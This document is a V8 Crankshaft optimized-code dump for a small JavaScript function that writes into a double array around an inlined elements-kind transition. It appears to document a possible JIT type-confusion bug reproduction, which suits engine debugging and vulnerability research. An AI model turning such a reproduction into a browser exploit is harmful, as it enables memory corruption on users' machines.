--- Raw source ---
(){
    swap();
    double_arr2[0] = 1;
    transition();
    double_arr2[1] = expected;
}


--- Optimized code ---
optimization_id = 0
source_position = 650
kind = OPTIMIZED_FUNCTION
name = f
stack_slots = 8
compiler = crankshaft
Instructions (size = 1463)
0x26c10af096c0     0  55             push rbp
0x26c10af096c1     1  4889e5         REX.W movq rbp,rsp
0x26c10af096c4     4  56             push rsi
0x26c10af096c5     5  57             push rdi
0x26c10af096c6     6  4883ec20       REX.W subq rsp,0x20
0x26c10af096ca    10  50             push rax
0x26c10af096cb    11  b804000000     movl rax,0x4
0x26c10af096d0    16  49baefdeefbeaddeefbe REX.W movq r10,0xbeefdeadbeefdeef
0x26c10af096da    26  4c8914c4       REX.W movq [rsp+rax*8],r10
0x26c10af096de    30  ffc8           decl rax
0x26c10af096e0    32  75f8           jnz 26  (0x26c10af096da)
0x26c10af096e2    34  58             pop rax
                  ;;; <@0,#0> -------------------- B0 --------------------
                  ;;; <@4,#3> prologue
                  ;;; Prologue begin
                  ;;; Prologue end
                  ;;; <@8,#5> -------------------- B1 --------------------
                  ;;; <@10,#6> context
0x26c10af096e3    35  488b45f8       REX.W movq rax,[rbp-0x8]
                  ;;; <@11,#6> gap
0x26c10af096e7    39  488945e8       REX.W movq [rbp-0x18],rax
                  ;;; <@14,#10> -------------------- B2 --------------------
                  ;;; <@15,#10> gap
0x26c10af096eb    43  488bf0         REX.W movq rsi,rax
                  ;;; <@16,#12> stack-check
0x26c10af096ee    46  493ba5700c0000 REX.W cmpq rsp,[r13+0xc70]
0x26c10af096f5    53  7305           jnc 60  (0x26c10af096fc)
0x26c10af096f7    55  e804fcedff     call StackCheck  (0x26c10ade9300)    ;; code: BUILTIN
                  ;;; <@18,#12> lazy-bailout
                  ;;; <@20,#16> push-argument
0x26c10af096fc    60  49ba713270da59340000 REX.W movq r10,0x3459da703271    ;; object: 0x3459da703271 <JS Global Object>
0x26c10af09706    70  4152           push r10
                  ;;; <@22,#13> constant-t
0x26c10af09708    72  48bf71242371ce040000 REX.W movq rdi,0x4ce71232471    ;; object: 0x4ce71232471 <JS Function swap (SharedFunctionInfo 0x4ce71231351)>
                  ;;; <@23,#13> gap
0x26c10af09712    82  488b75e8       REX.W movq rsi,[rbp-0x18]
                  ;;; <@24,#18> invoke-function
0x26c10af09716    86  488b7727       REX.W movq rsi,[rdi+0x27]
0x26c10af0971a    90  498b55a0       REX.W movq rdx,[r13-0x60]
0x26c10af0971e    94  33c0           xorl rax,rax
0x26c10af09720    96  ff5737         call [rdi+0x37]
                  ;;; <@26,#19> lazy-bailout
                  ;;; <@28,#20> constant-t
0x26c10af09723    99  48b851c670da59340000 REX.W movq rax,0x3459da70c651    ;; object: 0x3459da70c651 <JS Array[2]>
                  ;;; <@30,#23> check-maps
0x26c10af0972d   109  49ba793cc87cab220000 REX.W movq r10,0x22ab7cc83c79    ;; object: 0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>
0x26c10af09737   119  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af0973b   123  0f85ca040000   jnz 1355  (0x26c10af09c0b)
                  ;;; <@32,#25> check-maps
                  ;;; <@34,#27> check-maps
                  ;;; <@36,#20> constant-t
0x26c10af09741   129  48b851c670da59340000 REX.W movq rax,0x3459da70c651    ;; object: 0x3459da70c651 <JS Array[2]>
                  ;;; <@38,#28> load-named-field
0x26c10af0974b   139  488b580f       REX.W movq rbx,[rax+0xf]
                  ;;; <@40,#20> constant-t
0x26c10af0974f   143  48b851c670da59340000 REX.W movq rax,0x3459da70c651    ;; object: 0x3459da70c651 <JS Array[2]>
                  ;;; <@42,#29> load-named-field
0x26c10af09759   153  4c8b5017       REX.W movq r10,[rax+0x17]
0x26c10af0975d   157  41f6c201       testb r10,0x1
0x26c10af09761   161  7410           jz 179  (0x26c10af09773)
                  Abort message: 
                  Operand is not a smi
0x26c10af09763   163  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af0976d   173  e8aea9dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09772   178  cc             int3l
0x26c10af09773   179  8b401b         movl rax,[rax+0x1b]
                  ;;; <@44,#30> bounds-check
0x26c10af09776   182  83f800         cmpl rax,0x0
0x26c10af09779   185  0f8691040000   jna 1360  (0x26c10af09c10)
                  ;;; <@46,#136> constant-d
0x26c10af0977f   191  49ba000000000000f03f REX.W movq r10,0x3ff0000000000000
0x26c10af09789   201  c4c1f96ec2     vmovq xmm0,r10
                  ;;; <@48,#31> store-keyed
0x26c10af0978e   206  c5fb11430f     vmovsd [rbx+0xf],xmm0
                  ;;; <@50,#47> gap
0x26c10af09793   211  33db           xorl rbx,rbx
                  ;;; <@52,#48> -------------------- B3 (loop header) --------------------
0x26c10af09795   213  48895de0       REX.W movq [rbp-0x20],rbx
                  ;;; <@54,#51> constant-t
0x26c10af09799   217  48b809c570da59340000 REX.W movq rax,0x3459da70c509    ;; object: 0x3459da70c509 <JS Array[2]>
                  ;;; <@56,#52> check-maps
0x26c10af097a3   227  49ba693ac87cab220000 REX.W movq r10,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af097ad   237  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af097b1   241  0f855e040000   jnz 1365  (0x26c10af09c15)
                  ;;; <@58,#51> constant-t
0x26c10af097b7   247  48b809c570da59340000 REX.W movq rax,0x3459da70c509    ;; object: 0x3459da70c509 <JS Array[2]>
                  ;;; <@60,#53> load-named-field
0x26c10af097c1   257  4c8b5017       REX.W movq r10,[rax+0x17]
0x26c10af097c5   261  41f6c201       testb r10,0x1
0x26c10af097c9   265  7410           jz 283  (0x26c10af097db)
                  Abort message: 
                  Operand is not a smi
0x26c10af097cb   267  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af097d5   277  e846a9dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af097da   282  cc             int3l
0x26c10af097db   283  8b501b         movl rdx,[rax+0x1b]
                  ;;; <@63,#54> compare-numeric-and-branch
0x26c10af097de   286  3bda           cmpl rbx,rdx
0x26c10af097e0   288  0f8d19030000   jge 1087  (0x26c10af09aff)
                  ;;; <@64,#55> -------------------- B4 (unreachable/replaced) --------------------
                  ;;; <@68,#61> -------------------- B5 --------------------
                  ;;; <@70,#63> stack-check
0x26c10af097e6   294  493ba5700c0000 REX.W cmpq rsp,[r13+0xc70]
0x26c10af097ed   301  0f826f030000   jc 1186  (0x26c10af09b62)
                  ;;; <@72,#51> constant-t
0x26c10af097f3   307  48b809c570da59340000 REX.W movq rax,0x3459da70c509    ;; object: 0x3459da70c509 <JS Array[2]>
                  ;;; <@74,#67> load-named-field
0x26c10af097fd   317  488b400f       REX.W movq rax,[rax+0xf]
                  ;;; <@76,#69> bounds-check
0x26c10af09801   321  3bd3           cmpl rdx,rbx
0x26c10af09803   323  0f8611040000   jna 1370  (0x26c10af09c1a)
                  ;;; <@78,#70> load-keyed
0x26c10af09809   329  488b54d80f     REX.W movq rdx,[rax+rbx*8+0xf]
                  ;;; <@79,#70> gap
0x26c10af0980e   334  488955d8       REX.W movq [rbp-0x28],rdx
                  ;;; <@80,#76> allocate
0x26c10af09812   338  498b8d68fc0300 REX.W movq rcx,[r13+0x3fc68]
0x26c10af09819   345  488bc1         REX.W movq rax,rcx
0x26c10af0981c   348  4883c038       REX.W addq rax,0x38
0x26c10af09820   352  493b8570fc0300 REX.W cmpq rax,[r13+0x3fc70]
0x26c10af09827   359  0f877d030000   ja 1258  (0x26c10af09baa)
0x26c10af0982d   365  a807           test al,0x7
0x26c10af0982f   367  7410           jz 385  (0x26c10af09841)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af09831   369  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af0983b   379  e8e0a8dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09840   384  cc             int3l
0x26c10af09841   385  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af09848   392  48ffc1         REX.W incq rcx
                  ;;; <@81,#76> gap
0x26c10af0984b   395  48894dd0       REX.W movq [rbp-0x30],rcx
                  ;;; <@82,#78> store-named-field
0x26c10af0984f   399  f6c101         testb rcx,0x1
0x26c10af09852   402  7510           jnz 420  (0x26c10af09864)
                  Abort message: 
                  Operand is a smi
0x26c10af09854   404  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0985e   414  e8bda8dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09863   419  cc             int3l
0x26c10af09864   420  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af0986e   430  4c89510f       REX.W movq [rcx+0xf],r10
                  ;;; <@84,#80> store-named-field
0x26c10af09872   434  f6c101         testb rcx,0x1
0x26c10af09875   437  7510           jnz 455  (0x26c10af09887)
                  Abort message: 
                  Operand is a smi
0x26c10af09877   439  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09881   449  e89aa8dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09886   454  cc             int3l
0x26c10af09887   455  49bad131c87cab220000 REX.W movq r10,0x22ab7cc831d1    ;; object: 0x22ab7cc831d1 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af09891   465  4c8951ff       REX.W movq [rcx-0x1],r10
                  ;;; <@86,#82> store-named-field
0x26c10af09895   469  f6c101         testb rcx,0x1
0x26c10af09898   472  7510           jnz 490  (0x26c10af098aa)
                  Abort message: 
                  Operand is a smi
0x26c10af0989a   474  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af098a4   484  e877a8dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af098a9   489  cc             int3l
0x26c10af098aa   490  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af098b4   500  4c895107       REX.W movq [rcx+0x7],r10
                  ;;; <@88,#83> store-named-field
0x26c10af098b8   504  f6c101         testb rcx,0x1
0x26c10af098bb   507  7510           jnz 525  (0x26c10af098cd)
                  Abort message: 
                  Operand is a smi
0x26c10af098bd   509  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af098c7   519  e854a8dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af098cc   524  cc             int3l
0x26c10af098cd   525  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af098d7   535  4c895117       REX.W movq [rcx+0x17],r10
                  ;;; <@90,#84> store-named-field
0x26c10af098db   539  f6c101         testb rcx,0x1
0x26c10af098de   542  7510           jnz 560  (0x26c10af098f0)
                  Abort message: 
                  Operand is a smi
0x26c10af098e0   544  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af098ea   554  e831a8dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af098ef   559  cc             int3l
0x26c10af098f0   560  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af098fa   570  4c89511f       REX.W movq [rcx+0x1f],r10
                  ;;; <@92,#85> store-named-field
0x26c10af098fe   574  f6c101         testb rcx,0x1
0x26c10af09901   577  7510           jnz 595  (0x26c10af09913)
                  Abort message: 
                  Operand is a smi
0x26c10af09903   579  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0990d   589  e80ea8dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09912   594  cc             int3l
0x26c10af09913   595  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af0991d   605  4c895127       REX.W movq [rcx+0x27],r10
                  ;;; <@94,#86> store-named-field
0x26c10af09921   609  f6c101         testb rcx,0x1
0x26c10af09924   612  7510           jnz 630  (0x26c10af09936)
                  Abort message: 
                  Operand is a smi
0x26c10af09926   614  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09930   624  e8eba7dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09935   629  cc             int3l
0x26c10af09936   630  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af09940   640  4c89512f       REX.W movq [rcx+0x2f],r10
                  ;;; <@96,#90> store-named-field
0x26c10af09944   644  f6c101         testb rcx,0x1
0x26c10af09947   647  7510           jnz 665  (0x26c10af09959)
                  Abort message: 
                  Operand is a smi
0x26c10af09949   649  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09953   659  e8c8a7dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09958   664  cc             int3l
0x26c10af09959   665  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af09963   675  4c895117       REX.W movq [rcx+0x17],r10
                  ;;; <@98,#91> store-named-field
0x26c10af09967   679  f6c101         testb rcx,0x1
0x26c10af0996a   682  7510           jnz 700  (0x26c10af0997c)
                  Abort message: 
                  Operand is a smi
0x26c10af0996c   684  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09976   694  e8a5a7dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0997b   699  cc             int3l
0x26c10af0997c   700  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af09986   710  4c89511f       REX.W movq [rcx+0x1f],r10
                  ;;; <@100,#92> store-named-field
0x26c10af0998a   714  f6c101         testb rcx,0x1
0x26c10af0998d   717  7510           jnz 735  (0x26c10af0999f)
                  Abort message: 
                  Operand is a smi
0x26c10af0998f   719  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09999   729  e882a7dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0999e   734  cc             int3l
0x26c10af0999f   735  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af099a9   745  4c895127       REX.W movq [rcx+0x27],r10
                  ;;; <@102,#93> store-named-field
0x26c10af099ad   749  f6c101         testb rcx,0x1
0x26c10af099b0   752  7510           jnz 770  (0x26c10af099c2)
                  Abort message: 
                  Operand is a smi
0x26c10af099b2   754  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af099bc   764  e85fa7dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af099c1   769  cc             int3l
0x26c10af099c2   770  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af099cc   780  4c89512f       REX.W movq [rcx+0x2f],r10
                  ;;; <@104,#94> check-non-smi
0x26c10af099d0   784  f6c201         testb rdx,0x1
0x26c10af099d3   787  0f8446020000   jz 1375  (0x26c10af09c1f)
                  ;;; <@106,#36> constant-t
0x26c10af099d9   793  48bec13c2071ce040000 REX.W movq rsi,0x4ce71203cc1    ;; object: 0x4ce71203cc1 <FixedArray[251]>
                  ;;; <@107,#36> gap
0x26c10af099e3   803  488bc2         REX.W movq rax,rdx
                  ;;; <@108,#95> transition-elements-kind
0x26c10af099e6   806  49ba793cc87cab220000 REX.W movq r10,0x22ab7cc83c79    ;; object: 0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>
0x26c10af099f0   816  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af099f4   820  0f853d000000   jnz 887  (0x26c10af09a37)
0x26c10af099fa   826  50             push rax
0x26c10af099fb   827  51             push rcx
0x26c10af099fc   828  52             push rdx
0x26c10af099fd   829  53             push rbx
0x26c10af099fe   830  56             push rsi
0x26c10af099ff   831  57             push rdi
0x26c10af09a00   832  4150           push r8
0x26c10af09a02   834  4151           push r9
0x26c10af09a04   836  4153           push r11
0x26c10af09a06   838  4154           push r12
0x26c10af09a08   840  4156           push r14
0x26c10af09a0a   842  4157           push r15
0x26c10af09a0c   844  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af09a11   849  48bb693ac87cab220000 REX.W movq rbx,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af09a1b   859  e8e0eeffff     call 0x26c10af08900     ;; code: STUB, TransitionElementsKindStub, minor: 1026
0x26c10af09a20   864  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af09a25   869  415f           pop r15
0x26c10af09a27   871  415e           pop r14
0x26c10af09a29   873  415c           pop r12
0x26c10af09a2b   875  415b           pop r11
0x26c10af09a2d   877  4159           pop r9
0x26c10af09a2f   879  4158           pop r8
0x26c10af09a31   881  5f             pop rdi
0x26c10af09a32   882  5e             pop rsi
0x26c10af09a33   883  5b             pop rbx
0x26c10af09a34   884  5a             pop rdx
0x26c10af09a35   885  59             pop rcx
0x26c10af09a36   886  58             pop rax
                  ;;; <@110,#95> lazy-bailout
                  ;;; <@111,#95> gap
0x26c10af09a37   887  488b45d8       REX.W movq rax,[rbp-0x28]
                  ;;; <@112,#96> check-maps
0x26c10af09a3b   891  49ba693ac87cab220000 REX.W movq r10,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af09a45   901  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af09a49   905  0f85d5010000   jnz 1380  (0x26c10af09c24)
                  ;;; <@114,#101> load-named-field
0x26c10af09a4f   911  488b580f       REX.W movq rbx,[rax+0xf]
                  ;;; <@116,#102> check-maps
0x26c10af09a53   915  49ba0923f866211c0000 REX.W movq r10,0x1c2166f82309    ;; object: 0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af09a5d   925  4c3953ff       REX.W cmpq [rbx-0x1],r10
0x26c10af09a61   929  0f85c2010000   jnz 1385  (0x26c10af09c29)
                  ;;; <@118,#103> load-named-field
0x26c10af09a67   935  4c8b5017       REX.W movq r10,[rax+0x17]
0x26c10af09a6b   939  41f6c201       testb r10,0x1
0x26c10af09a6f   943  7410           jz 961  (0x26c10af09a81)
                  Abort message: 
                  Operand is not a smi
0x26c10af09a71   945  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af09a7b   955  e8a0a6dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09a80   960  cc             int3l
0x26c10af09a81   961  8b401b         movl rax,[rax+0x1b]
                  ;;; <@120,#104> bounds-check
0x26c10af09a84   964  83f800         cmpl rax,0x0
0x26c10af09a87   967  0f86a1010000   jna 1390  (0x26c10af09c2e)
                  ;;; <@122,#75> constant-i
0x26c10af09a8d   973  33c0           xorl rax,rax
                  ;;; <@123,#75> gap
0x26c10af09a8f   975  488bd3         REX.W movq rdx,rbx
0x26c10af09a92   978  488bd8         REX.W movq rbx,rax
0x26c10af09a95   981  488b45d0       REX.W movq rax,[rbp-0x30]
                  ;;; <@124,#106> store-keyed
0x26c10af09a99   985  488944da0f     REX.W movq [rdx+rbx*8+0xf],rax
0x26c10af09a9e   990  488d5cda0f     REX.W leaq rbx,[rdx+rbx*8+0xf]
0x26c10af09aa3   995  f6c201         testb rdx,0x1
0x26c10af09aa6   998  7510           jnz 1016  (0x26c10af09ab8)
                  Abort message: 
                  Operand is a smi
0x26c10af09aa8  1000  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09ab2  1010  e869a6dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09ab7  1015  cc             int3l
0x26c10af09ab8  1016  483b03         REX.W cmpq rax,[rbx]
0x26c10af09abb  1019  7401           jz 1022  (0x26c10af09abe)
0x26c10af09abd  1021  cc             int3l
0x26c10af09abe  1022  48250000f8ff   REX.W and rax,0xfffffffffff80000
0x26c10af09ac4  1028  f6400802       testb [rax+0x8],0x2
0x26c10af09ac8  1032  7415           jz 1055  (0x26c10af09adf)
0x26c10af09aca  1034  48c7c00000f8ff REX.W movq rax,0xfff80000
0x26c10af09ad1  1041  4823c2         REX.W andq rax,rdx
0x26c10af09ad4  1044  f6400804       testb [rax+0x8],0x4
0x26c10af09ad8  1048  7405           jz 1055  (0x26c10af09adf)
0x26c10af09ada  1050  e8c1f2ffff     call 0x26c10af08da0     ;; code: STUB, RecordWriteStub, minor: 8962
0x26c10af09adf  1055  48bbefbeadbeedbeadde REX.W movq rbx,0xdeadbeedbeadbeef
0x26c10af09ae9  1065  48b8efbeadbeedbeadde REX.W movq rax,0xdeadbeedbeadbeef
                  ;;; <@125,#106> gap
0x26c10af09af3  1075  488b45e0       REX.W movq rax,[rbp-0x20]
                  ;;; <@126,#111> add-i
0x26c10af09af7  1079  8d5801         leal rbx,[rax+0x1]
                  ;;; <@129,#114> goto
0x26c10af09afa  1082  e996fcffff     jmp 213  (0x26c10af09795)
                  ;;; <@130,#58> -------------------- B6 (unreachable/replaced) --------------------
                  ;;; <@134,#115> -------------------- B7 (unreachable/replaced) --------------------
                  ;;; <@138,#119> -------------------- B8 --------------------
                  ;;; <@140,#122> constant-d
0x26c10af09aff  1087  49ba7156341223010000 REX.W movq r10,0x12312345671
0x26c10af09b09  1097  c4c1f96ec2     vmovq xmm0,r10
                  ;;; <@142,#20> constant-t
0x26c10af09b0e  1102  48b851c670da59340000 REX.W movq rax,0x3459da70c651    ;; object: 0x3459da70c651 <JS Array[2]>
                  ;;; <@144,#128> load-named-field
0x26c10af09b18  1112  488b580f       REX.W movq rbx,[rax+0xf]
                  ;;; <@146,#20> constant-t
0x26c10af09b1c  1116  48b851c670da59340000 REX.W movq rax,0x3459da70c651    ;; object: 0x3459da70c651 <JS Array[2]>
                  ;;; <@148,#129> load-named-field
0x26c10af09b26  1126  4c8b5017       REX.W movq r10,[rax+0x17]
0x26c10af09b2a  1130  41f6c201       testb r10,0x1
0x26c10af09b2e  1134  7410           jz 1152  (0x26c10af09b40)
                  Abort message: 
                  Operand is not a smi
0x26c10af09b30  1136  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af09b3a  1146  e8e1a5dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09b3f  1151  cc             int3l
0x26c10af09b40  1152  8b401b         movl rax,[rax+0x1b]
                  ;;; <@150,#130> bounds-check
0x26c10af09b43  1155  83f801         cmpl rax,0x1
0x26c10af09b46  1158  0f86e7000000   jna 1395  (0x26c10af09c33)
                  ;;; <@152,#131> store-keyed
0x26c10af09b4c  1164  c5fb114317     vmovsd [rbx+0x17],xmm0
                  ;;; <@154,#2> constant-t
0x26c10af09b51  1169  48b81123b03897130000 REX.W movq rax,0x139738b02311    ;; object: 0x139738b02311 <undefined>
                  ;;; <@156,#134> return
0x26c10af09b5b  1179  488be5         REX.W movq rsp,rbp
0x26c10af09b5e  1182  5d             pop rbp
0x26c10af09b5f  1183  c20800         ret 0x8
                  ;;; <@70,#63> -------------------- Deferred stack-check --------------------
0x26c10af09b62  1186  50             push rax
0x26c10af09b63  1187  51             push rcx
0x26c10af09b64  1188  52             push rdx
0x26c10af09b65  1189  53             push rbx
0x26c10af09b66  1190  56             push rsi
0x26c10af09b67  1191  57             push rdi
0x26c10af09b68  1192  4150           push r8
0x26c10af09b6a  1194  4151           push r9
0x26c10af09b6c  1196  4153           push r11
0x26c10af09b6e  1198  4154           push r12
0x26c10af09b70  1200  4156           push r14
0x26c10af09b72  1202  4157           push r15
0x26c10af09b74  1204  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af09b79  1209  488b75f8       REX.W movq rsi,[rbp-0x8]
0x26c10af09b7d  1213  33c0           xorl rax,rax
0x26c10af09b7f  1215  48bb309072cad27f0000 REX.W movq rbx,0x7fd2ca729030    ;; external reference (Runtime::StackGuard)
0x26c10af09b89  1225  e8b2c4dfff     call 0x26c10ad06040     ;; code: STUB, CEntryStub, minor: 9
0x26c10af09b8e  1230  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af09b93  1235  415f           pop r15
0x26c10af09b95  1237  415e           pop r14
0x26c10af09b97  1239  415c           pop r12
0x26c10af09b99  1241  415b           pop r11
0x26c10af09b9b  1243  4159           pop r9
0x26c10af09b9d  1245  4158           pop r8
0x26c10af09b9f  1247  5f             pop rdi
0x26c10af09ba0  1248  5e             pop rsi
0x26c10af09ba1  1249  5b             pop rbx
0x26c10af09ba2  1250  5a             pop rdx
0x26c10af09ba3  1251  59             pop rcx
0x26c10af09ba4  1252  58             pop rax
0x26c10af09ba5  1253  e949fcffff     jmp 307  (0x26c10af097f3)
                  ;;; <@80,#76> -------------------- Deferred allocate --------------------
0x26c10af09baa  1258  33c9           xorl rcx,rcx
0x26c10af09bac  1260  50             push rax
0x26c10af09bad  1261  51             push rcx
0x26c10af09bae  1262  52             push rdx
0x26c10af09baf  1263  53             push rbx
0x26c10af09bb0  1264  56             push rsi
0x26c10af09bb1  1265  57             push rdi
0x26c10af09bb2  1266  4150           push r8
0x26c10af09bb4  1268  4151           push r9
0x26c10af09bb6  1270  4153           push r11
0x26c10af09bb8  1272  4154           push r12
0x26c10af09bba  1274  4156           push r14
0x26c10af09bbc  1276  4157           push r15
0x26c10af09bbe  1278  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af09bc3  1283  6a00           push 0x0
0x26c10af09bc5  1285  c644240438     movb [rsp+0x4],0x38
0x26c10af09bca  1290  6a00           push 0x0
0x26c10af09bcc  1292  48bec13c2071ce040000 REX.W movq rsi,0x4ce71203cc1    ;; object: 0x4ce71203cc1 <FixedArray[251]>
0x26c10af09bd6  1302  b802000000     movl rax,0x2
0x26c10af09bdb  1307  48bb809b72cad27f0000 REX.W movq rbx,0x7fd2ca729b80    ;; external reference (Runtime::AllocateInTargetSpace)
0x26c10af09be5  1317  e856c4dfff     call 0x26c10ad06040     ;; code: STUB, CEntryStub, minor: 9
0x26c10af09bea  1322  4889442470     REX.W movq [rsp+0x70],rax
0x26c10af09bef  1327  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af09bf4  1332  415f           pop r15
0x26c10af09bf6  1334  415e           pop r14
0x26c10af09bf8  1336  415c           pop r12
0x26c10af09bfa  1338  415b           pop r11
0x26c10af09bfc  1340  4159           pop r9
0x26c10af09bfe  1342  4158           pop r8
0x26c10af09c00  1344  5f             pop rdi
0x26c10af09c01  1345  5e             pop rsi
0x26c10af09c02  1346  5b             pop rbx
0x26c10af09c03  1347  5a             pop rdx
0x26c10af09c04  1348  59             pop rcx
0x26c10af09c05  1349  58             pop rax
0x26c10af09c06  1350  e940fcffff     jmp 395  (0x26c10af0984b)
                  ;;; -------------------- Jump table --------------------
0x26c10af09c0b  1355  e804a4c7ff     call 0x26c10ab84014     ;; deoptimization bailout 2
0x26c10af09c10  1360  e809a4c7ff     call 0x26c10ab8401e     ;; deoptimization bailout 3
0x26c10af09c15  1365  e80ea4c7ff     call 0x26c10ab84028     ;; deoptimization bailout 4
0x26c10af09c1a  1370  e81da4c7ff     call 0x26c10ab8403c     ;; deoptimization bailout 6
0x26c10af09c1f  1375  e822a4c7ff     call 0x26c10ab84046     ;; deoptimization bailout 7
0x26c10af09c24  1380  e831a4c7ff     call 0x26c10ab8405a     ;; deoptimization bailout 9
0x26c10af09c29  1385  e836a4c7ff     call 0x26c10ab84064     ;; deoptimization bailout 10
0x26c10af09c2e  1390  e83ba4c7ff     call 0x26c10ab8406e     ;; deoptimization bailout 11
0x26c10af09c33  1395  e840a4c7ff     call 0x26c10ab84078     ;; deoptimization bailout 12
                  ;;; Safepoint table.

Source positions:
 pc offset  position
        60       658
        72       658
        72       658
        82       658
        86       658
        99       658
        99       658
        99       658
        99       658
       109       658
       109       658
       129       658
       129       658
       129       658
       129       658
       129       658
       129       658
       139       658
       139       658
       143       658
       143       658
       153       658
       153       658
       182       658
       182       658
       191       658
       191       658
       206       658
       206       658
       211       658
       211       694
       213       694
       213       334
       217       334
       217       334
       227       334
       227       334
       247       334
       247       334
       257       334
       257       334
       286       334
       286       334
       286       334
       294       334
       294       334
       294       334
       307       334
       307       334
       317       334
       317       334
       321       334
       321       334
       329       334
       329       334
       334       334
       338       334
       395       334
       399       334
       434       334
       434       334
       469       334
       469       334
       504       334
       504       334
       539       334
       539       334
       574       334
       574       334
       609       334
       609       334
       644       334
       644       334
       679       334
       679       334
       714       334
       714       334
       749       334
       749       334
       784       334
       784       334
       793       334
       793       694
       803       694
       806       334
       887       334
       887       334
       887       334
       891       334
       911       334
       911       334
       915       334
       915       334
       935       334
       935       334
       964       334
       964       334
       973       334
       985       334
      1075       334
      1079       351
      1082       351
      1082       351
      1082       351
      1087       351
      1087       351
      1087       351
      1102       351
      1102       658
      1112       658
      1112       351
      1116       351
      1116       658
      1126       658
      1126       351
      1155       351
      1155       351
      1164       351
      1164       351
      1169       351
      1179       351
      1186       351
      1186       334
      1258       334

Inlined functions (count = 1)
 0x4ce71231279 <SharedFunctionInfo transition>

Deoptimization Input Data (deopt points = 13)
 index  ast id    argc     pc
     0       4       0     60
     1       5       0     99
     2       5       0     -1
     3       5       0     -1
     4      11       0     -1
     5      15       0    307
     6      15       0     -1
     7      15       0     -1
     8      15       0    887
     9      15       0     -1
    10      15       0     -1
    11      15       0     -1
    12      28       0     -1

Safepoints (size = 63)
0x26c10af096fc    60  00010000 (sp -> fp)       0
0x26c10af09723    99  00010000 (sp -> fp)       1
0x26c10af09a20   864  11010000 | rax | rsi (sp -> fp)       8
0x26c10af09b8e  1230  00010000 (sp -> fp)       5
